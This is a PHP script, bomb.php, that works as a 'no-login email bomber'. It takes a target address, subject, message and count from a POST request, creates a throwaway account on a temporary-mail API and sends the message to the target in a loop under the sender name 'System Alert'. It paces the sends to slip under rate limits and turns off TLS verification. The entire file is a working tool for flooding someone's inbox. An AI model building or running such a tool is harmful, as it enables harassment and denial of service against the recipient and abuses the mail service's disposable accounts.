<?php
// bomb.php - No-login email bomber (cURL-free version)
ini_set('display_errors', 1);
error_reporting(E_ALL);
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['ok' => false, 'error' => 'POST only']); exit;
}

$target  = trim($_POST['target'] ?? '');
$subject = trim($_POST['subject'] ?? '');
$message = $_POST['message'] ?? '';
$count   = (int)($_POST['count'] ?? 10);

if (!filter_var($target, FILTER_VALIDATE_EMAIL) || $subject === '' || $count < 1) {
    echo json_encode(['ok' => false, 'error' => 'bad input']); exit;
}

// cURL-free request function using stream context
function req($url, $method = 'GET', $data = null, $token = null) {
    $opts = [
        'http' => [
            'method' => $method,
            'header' => "Content-Type: application/json\r\n"
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false
        ]
    ];
    
    if ($token) {
        $opts['http']['header'] .= "Authorization: Bearer $token\r\n";
    }
    if ($data) {
        $opts['http']['content'] = json_encode($data);
    }

    $context = stream_context_create($opts);
    $res = @file_get_contents($url, false, $context);
    if ($res === false) {
        return null; // Request failed
    }
    return json_decode($res, true);
}

$apiBase = 'https://api.mail.tm';

try {
    // 1. Get domains
    $domains = req("$apiBase/domains");
    if (!isset($domains['hydra:member'][0]['domain'])) {
        echo json_encode(['ok' => false, 'error' => 'API down or domains missing']); exit;
    }
    $domain = $domains['hydra:member'][0]['domain'];

    // 2. Create temp account
    $email = 'bomber_' . rand(10000, 99999) . '@' . $domain;
    $pass  = bin2hex(random_bytes(8));
    $acc = req("$apiBase/accounts", 'POST', ['address' => $email, 'password' => $pass]);
    if (!isset($acc['id'])) {
        echo json_encode(['ok' => false, 'error' => 'Acc create failed. API response: ' . json_encode($acc)]); exit;
    }

    // 3. Login to get token
    $login = req("$apiBase/token", 'POST', ['address' => $email, 'password' => $pass]);
    if (!isset($login['token'])) {
        echo json_encode(['ok' => false, 'error' => 'Login failed']); exit;
    }
    $token = $login['token'];

    // 4. Send emails in a loop
    $sent = 0;
    $errors = [];
    
    for ($i = 0; $i < $count; $i++) {
        $payload = [
            'from' => ['address' => $email, 'name' => 'System Alert'],
            'to' => [['address' => $target]],
            'subject' => $subject,
            'text' => $message
        ];
        $res = req("$apiBase/messages", 'POST', $payload, $token);
        
        if (isset($res['id'])) {
            $sent++;
        } else {
            $errors[] = $res ? json_encode($res) : 'Empty response/Network issue';
        }
        
        // Spam control: delay to avoid rate limits (1 sec)
        if ($i < $count - 1) sleep(1);
    }

    if ($sent === 0) {
        echo json_encode(['ok' => false, 'error' => 'All failed. Reason: ' . implode(', ', array_slice($errors, 0, 2))]); 
    } else {
        echo json_encode(['ok' => true, 'sent' => $sent, 'failed' => count($errors)]);
    }
    
} catch (Throwable $e) {
    echo json_encode(['ok' => false, 'error' => 'PHP Error: ' . $e->getMessage()]);
}
